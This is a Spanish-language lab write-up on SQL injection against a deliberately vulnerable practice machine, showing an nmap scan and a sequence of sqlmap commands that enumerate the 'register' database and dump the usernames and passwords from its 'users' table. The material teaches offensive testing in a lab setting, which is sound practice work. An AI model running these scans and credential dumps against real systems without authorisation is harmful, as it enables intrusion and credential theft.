
----
- TAG: #Inyecciones-SQL #Inyecciones #SQLmap 
----
# Inyección SQL con SQLmap y Doclerlabs

En este apartado vamos a estar aprendiendo un ejemplo similar al anterior utilizando la herramienta de **SQLmap**, pero esta vez con una máquina de **Doclerlabs** llamada [Database](https://mega.nz/file/JaFAhBDB#4nFyDl36xA7hyVpo8hdJSuiIh34IwjhTGG2yGtk1FLs) de la plataforma de nuestro buen profe **Mario**.

## Despliegue de la Máquina

Esta máquina es ideal para practicar las inyecciones SQL. Una vez lo hayamos descargado, simplemente realizamos el siguiente comando:

```bash
sudo bash auto_deploy.sh database.tar
```

Una vez desplegada la máquina, nos mostrará la dirección IP en la parte de abajo.

## Escaneo de Puertos

Nos convertimos en usuarios **root** y realizamos un escaneo de puertos con **nmap**:

```bash
nmap -p- -sS -sC -sV --min-rate 5000 -n -vvv -Pn 1.2.3.4
```

Normalmente, cuando realizamos ciertos escaneos, no solemos encontrar las bases de datos expuestas, así que eso es algo normal. Hay ocasiones que sí suelen estar expuestas.

## Acceso a la Página Web

Ingresamos a la página web con la dirección IP de la máquina víctima que nos hemos descargado. Vemos que nos muestra una página de login. Por lo general, en los logins suelen estar detrás las bases de datos, pero se encuentran de manera interna.

Tampoco suele funcionar con ataques de fuerza bruta. Cuando nos encontremos con estos casos, lo más recomendable es hacer una **inyección SQL**.

## Uso de SQLmap

Para ello, abrimos la herramienta de **SQLmap** para utilizarla como en clases anteriores:

```bash
sqlmap -u http://1.2.3.4/index.php --forms --dbs --batch
```

- El parámetro `--batch` nos permite que **SQLmap** haga sus funciones de manera automatizada.
- `--dbs` nos permite enumerar las bases de datos que existen.
- `--forms` indica que debe atacar los formularios `.html` que se vayan encontrando, es decir, los espacios que deben ser llenados.

Al terminar con el escaneo, veremos que nos muestra dos archivos muy importantes: `register` y `sys`. En **register** fácilmente lograremos encontrar credenciales.

## Enumeración de la Base de Datos

Ahora ejecutaremos el siguiente comando para enumerar la base de datos `register`. Como ya sabemos la base de datos a atacar, borramos `--dbs` y añadimos `-D` de Database:

```bash
sqlmap -u http://1.2.3.4/index.php --forms -D register --tables --batch
```

A continuación, nos mostrará la tabla `users`. Con esta información le agregamos el parámetro `-T` ya que sabemos el nombre de la tabla y el parámetro `--columns` para que nos muestre la información de las columnas. Buscamos las columnas de la siguiente manera:

```bash
sqlmap -u http://1.2.3.4/index.php --forms -D register -T users --columns --batch
```

## Extracción de Datos

Ahora lo que queda por hacer es agregar el parámetro `-C` para que nos muestre la información de las columnas `passwd` y `username`:

```bash
sqlmap -u http://1.2.3.4/index.php --forms -D register -T users -C passwd,username --dump --batch
```

Y veremos que conseguimos ver las credenciales tanto de `passwd` como de `username`. Con esta información podremos ingresar con las credenciales correctas por la página web con la IP asignada.

¡Saludos desde Ecuador! 🇪🇨🫡

hola
